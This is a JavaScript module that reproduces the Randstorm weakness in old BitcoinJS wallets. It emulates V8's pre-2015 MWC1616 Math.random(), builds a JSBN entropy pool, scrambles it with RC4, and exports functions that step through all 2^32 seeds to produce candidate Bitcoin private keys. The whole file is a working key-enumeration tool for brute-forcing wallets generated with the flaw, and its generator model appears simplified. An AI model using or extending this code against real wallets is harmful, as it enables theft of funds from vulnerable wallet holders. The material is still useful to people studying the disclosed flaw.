// Randstorm vulnerability (disclosed November 2023 by Unciphered)
// BitcoinJS used JSBN's SecureRandom() which filled a 32-byte entropy pool
// via repeated Math.random() calls. Chrome/V8 (pre-2015) implemented
// Math.random() as MWC1616 seeded with only 32 bits — collapsing effective
// entropy from 256 bits to ~32 bits. The pool was then RC4-scrambled.
// Reference: https://www.unciphered.com/disclosure-of-vulnerable-bitcoin-wallet-library-2/

// MWC1616 as used in V8 before Chrome ~2015
let _s0 = 0, _s1 = 0;

function mwcSeed(seed) {
  _s0 = seed >>> 0;
  _s1 = seed >>> 0;
}

function mwcNext() {
  _s0 = (18000 * (_s0 & 0xffff) + (_s0 >>> 16)) >>> 0;
  _s1 = (30903 * (_s1 & 0xffff) + (_s1 >>> 16)) >>> 0;
  return (((_s0 & 0xffff) << 16) + (_s1 & 0xffff)) >>> 0;
}

// RC4 key scheduler + stream
function rc4Init(key) {
  const S = new Uint8Array(256);
  for (let i = 0; i < 256; i++) S[i] = i;
  let j = 0;
  for (let i = 0; i < 256; i++) {
    j = (j + S[i] + key[i % key.length]) & 0xff;
    const t = S[i]; S[i] = S[j]; S[j] = t;
  }
  return { S, i: 0, j: 0 };
}

function rc4Next(ctx) {
  ctx.i = (ctx.i + 1) & 0xff;
  ctx.j = (ctx.j + ctx.S[ctx.i]) & 0xff;
  const t = ctx.S[ctx.i]; ctx.S[ctx.i] = ctx.S[ctx.j]; ctx.S[ctx.j] = t;
  return ctx.S[(ctx.S[ctx.i] + ctx.S[ctx.j]) & 0xff];
}

function seedToKey(seed32) {
  mwcSeed(seed32);

  // JSBN rng_pool: 32 bytes, 16 Math.random() calls each giving 2 bytes
  // t = Math.floor(65536 * Math.random()); pool[i] = t>>>8; pool[i+1] = t&255
  const pool = new Uint8Array(32);
  for (let i = 0; i < 16; i++) {
    const t = mwcNext() >>> 16; // top 16 bits = Math.floor(65536 * mwc/2^32)
    pool[i * 2]     = (t >>> 8) & 0xff;
    pool[i * 2 + 1] =  t        & 0xff;
  }

  // RC4-scramble pool, stream first 32 bytes as private key
  const rc4 = rc4Init(pool);
  const key = new Uint8Array(32);
  for (let i = 0; i < 32; i++) key[i] = rc4Next(rc4);
  return key;
}

let _seed = 0;

export function resetRandstorm(startSeed = 0) { _seed = startSeed >>> 0; }
export function getRandstormSeed() { return _seed; }
export function randstormTotal() { return 0x100000000; }

export function nextRandstormKey() {
  if (_seed >= 0x100000000) return { key: null, seed: _seed, exhausted: true };
  const seed = _seed++;
  return { key: seedToKey(seed), seed, exhausted: false };
}
